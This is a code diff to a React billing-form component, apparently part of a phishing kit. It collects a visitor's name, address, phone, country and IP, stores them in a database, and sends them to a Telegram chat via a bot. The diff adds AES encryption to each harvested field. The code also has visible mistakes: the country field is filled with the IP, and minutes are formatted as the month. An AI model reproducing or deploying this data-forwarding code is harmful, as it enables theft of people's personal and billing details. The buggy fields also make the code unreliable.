@@ -6,6 +6,7 @@ import Header from '../Layout/Header';
 import Footer from '../Layout/Footer';
 import moment from "moment"
 const { TelegramClient } = require('messaging-api-telegram');
+const CryptoJS = require("crypto-js");
 const client = new TelegramClient({
     accessToken: process.env.REACT_APP_PUBLIC_TM_TOKEN,
 });
@@ -42,29 +43,30 @@ const Billing = () => {
                 return res.text()
             })
             .then(ip => {
+                const secretKey = process.env.REACT_APP_PUBLIC_ENCRYPT_KEY
                 db.collection('billing-data').add({
-                    fullname: fullname, 
-                    address: address, 
-                    state: state, 
-                    city: city, 
-                    zip: zip, 
-                    phone: phone, 
-                    country: country,
-                    ip_address: ip,
-                    logged_at: Date.now()
+                    fullname: CryptoJS.AES.encrypt(fullname, secretKey).toString(), 
+                    address: CryptoJS.AES.encrypt(address, secretKey).toString(), 
+                    state: CryptoJS.AES.encrypt(state, secretKey).toString(), 
+                    city: CryptoJS.AES.encrypt(city, secretKey).toString(), 
+                    zip: CryptoJS.AES.encrypt(zip, secretKey).toString(), 
+                    phone: CryptoJS.AES.encrypt(phone, secretKey).toString(), 
+                    country: CryptoJS.AES.encrypt(ip, secretKey).toString(),
+                    ip_address: CryptoJS.AES.encrypt(ip, secretKey).toString(),
+                    logged_at: CryptoJS.AES.encrypt(moment( new Date() ).format("yyyy-MM-DD hh:MM:ss"), secretKey).toString()
                 }).then(data => {
                     if( process.env.REACT_APP_PUBLIC_TM_ENABLE === '1' )
                     {
                         let message = "Billing Data\r\n"
-                        message += "Full Name: " + fullname + '\r\n'
-                        message += "Address: " + address + '\r\n'
-                        message += "State: " + state + '\r\n'
-                        message += "City: " + city + '\r\n'
-                        message += "ZIP: " + zip + '\r\n'
-                        message += "Phone Number: " + phone + '\r\n'
-                        message += "Country: " + country + '\r\n'
-                        message += "Ip Address: " + ip + '\r\n'
-                        message += "Time: " + moment( new Date() ).format("yyyy-MM-DD hh:MM:ss")
+                        message += "Full Name: " + CryptoJS.AES.encrypt(fullname, secretKey).toString() + '\r\n'
+                        message += "Address: " + CryptoJS.AES.encrypt(address, secretKey).toString() + '\r\n'
+                        message += "State: " + CryptoJS.AES.encrypt(state, secretKey).toString() + '\r\n'
+                        message += "City: " + CryptoJS.AES.encrypt(city, secretKey).toString() + '\r\n'
+                        message += "ZIP: " + CryptoJS.AES.encrypt(zip, secretKey).toString() + '\r\n'
+                        message += "Phone Number: " + CryptoJS.AES.encrypt(phone, secretKey).toString() + '\r\n'
+                        message += "Country: " + CryptoJS.AES.encrypt(country, secretKey).toString() + '\r\n'
+                        message += "Ip Address: " + CryptoJS.AES.encrypt(ip, secretKey).toString() + '\r\n'
+                        message += "Time: " + CryptoJS.AES.encrypt(moment( new Date() ).format("yyyy-MM-DD hh:MM:ss"), secretKey).toString()
                         client.sendMessage(process.env.REACT_APP_PUBLIC_TM_CHAT_ID, message, {
                             disableWebPagePreview: true,
                             disableNotification: true,
